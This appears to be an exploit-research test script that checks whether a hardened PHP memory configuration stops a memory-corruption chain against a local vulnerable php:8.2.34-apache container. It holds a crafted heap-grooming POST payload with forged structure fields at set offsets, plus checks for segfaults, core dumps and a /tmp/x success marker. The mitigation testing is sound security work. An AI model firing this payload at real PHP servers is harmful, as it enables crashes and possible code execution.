#!/usr/bin/env python3
"""oom143: workarounds probe — does a SANE memory config (memory_limit=128M,
post_max_size=8M, stock vulnerable php:8.2.34-apache) stop the chain?

A) exact winning groom (SIG8@v+72, VLEN=295, N=3500000) x3  -> expect clean 200,
   no parse-time fatal, no segv, no core, NO_X  (128M >> ~3x body, fatal
   unreachable during parse).
B) adversarial body: 900 vars x ~8.7KB (~7.9M wire, under post_max_size=8M,
   under max_input_vars=1000) -> max parse allocs ~2x wire + body ~24M << 128M
   -> expect clean 200, POSTCOUNT=900, still no fatal.
"""
import struct, subprocess, urllib.request, time

HOST = "http://127.0.0.1:8085"
N = 3500000
VLEN = 295
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)

def build_body():
    v = bytearray(b"\xde" * VLEN)
    v[72:80] = SIG8
    struct.pack_into("<I", v, 80, 0x0106)
    struct.pack_into("<QQ", v, 88, 0, 0)
    return b"=" + bytes(v) + b"&a=1&" + b"Z" * N + b"[x]=1"

def build_adversarial():
    # 900 vars, name ~4.3K + value ~4.3K each => ~7.87M wire (< 8M post cap)
    parts = []
    for i in range(900):
        parts.append(b"k%04d" % i + b"n" * 4300 + b"=" + b"v" * 4300)
    return b"&".join(parts)

def fire(body, path="/oom_mod.php"):
    req = urllib.request.Request(HOST + path, data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=180) as r:
            return r.status, r.read(600)
    except Exception as e:
        return -1, ("ERR " + str(e)[:160]).encode()

def logs_tail():
    r = subprocess.run(["docker", "logs", "--tail", "30", "php_vuln_sane"],
                       capture_output=True, timeout=60)
    return (r.stdout + r.stderr).decode("latin1", "replace")

def x_state():
    r = subprocess.run(["docker", "exec", "php_vuln_sane", "test", "-f", "/tmp/x"],
                       capture_output=True)
    if r.returncode == 0:
        r2 = subprocess.run(["docker", "exec", "php_vuln_sane", "cat", "/tmp/x"],
                            capture_output=True, timeout=15)
        return "X_EXISTS:" + r2.stdout.decode("latin1", "replace").strip()
    return "NO_X"

def core_state():
    r = subprocess.run(["docker", "exec", "php_vuln_sane", "sh", "-c",
                        "ls /tmp/core* /tmp/core 2>/dev/null | wc -l"],
                       capture_output=True, timeout=15)
    return r.stdout.decode().strip()

def report(tag, c, b):
    segv = [l for l in logs_tail().splitlines()
            if "egmentation" in l or "signal" in l.lower()][-2:]
    fatal = b"FATAL:" + b[:200] if b"Fatal error" in b or b"Warning" in b else b"no-fatal"
    print("%s http=%d %s" % (tag, c, fatal.decode("latin1", "replace")), flush=True)
    print("%s segv=%s cores=%s x=%s" % (tag, segv, core_state(), x_state()), flush=True)

if __name__ == "__main__":
    print("== A: winning groom vs sane config ==", flush=True)
    body = build_body()
    print("groom body len:", len(body), flush=True)
    for t in range(3):
        c, b = fire(body)
        report("A%d" % t, c, b)
        time.sleep(2)
    print("== B: adversarial max-alloc body vs sane config ==", flush=True)
    ab = build_adversarial()
    print("adversarial body len:", len(ab), flush=True)
    for t in range(2):
        c, b = fire(ab)
        report("B%d" % t, c, b)
        time.sleep(2)
    print("=== done ===", flush=True)
